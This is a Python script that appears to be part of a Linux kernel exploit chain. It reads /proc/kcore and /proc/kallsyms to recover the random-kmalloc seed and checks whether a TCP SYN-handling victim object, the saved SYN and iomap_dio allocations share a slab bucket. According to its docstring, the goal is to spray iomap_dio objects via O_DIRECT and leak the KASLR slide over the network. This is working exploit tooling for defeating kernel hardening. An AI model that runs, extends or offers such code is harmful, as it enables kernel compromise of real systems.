#!/usr/bin/env python3
"""iomap_match.py - victim == saved_syn == iomap_dio random-kmalloc bucket.

iomap_dio is allocated by __iomap_dio_rw (kmalloc_trace size 0x60).  Its
RANDOM_KMALLOC_CACHES hash input is the return address into iomap_dio_rw,
i.e. iomap_dio_rw+0x11.  A match lets an O_DIRECT spray put a 96-byte
iomap_dio object in the victim's cache; iomap_dio+8 is dops, a .text/.data
pointer (e.g. ext4_dio_write_ops) that leaks the KASLR slide over the wire.
"""
import struct


def rd(va, n):
    f = open('/proc/kcore', 'rb')
    h = f.read(64)
    off = struct.unpack_from('<Q', h, 0x20)[0]
    es = struct.unpack_from('<H', h, 0x36)[0]
    en = struct.unpack_from('<H', h, 0x38)[0]
    f.seek(off)
    for _ in range(en):
        ph = f.read(es)
        t = struct.unpack_from('<I', ph, 0)[0]
        po, pv, pp, pf = struct.unpack_from('<QQQQ', ph, 8)
        if t == 1 and pv <= va < pv + pf:
            f.seek(po + va - pv)
            return f.read(n)
    return None


s = {}
for line in open('/proc/kallsyms'):
    p = line.split()
    if len(p) >= 3:
        try:
            s[p[2]] = int(p[0], 16)
        except ValueError:
            pass
seed = struct.unpack('<Q', rd(s['random_kmalloc_seed'], 8))[0]
GOLD = 0x61C8864680B583EB
M = (1 << 64) - 1


def idx(c):
    return (((c ^ seed) & M) * GOLD & M) >> 60


v = idx(s['tcp_v4_route_req'] + 0x91)
sv = idx(s['tcp_reqsk_record_syn'] + 0x77)
io = idx(s['iomap_dio_rw'] + 0x11)
print("seed=%#x victim=%d saved=%d iomap=%d %s" %
      (seed, v, sv, io, "IOMAP3" if v == sv == io else "nomatch"))
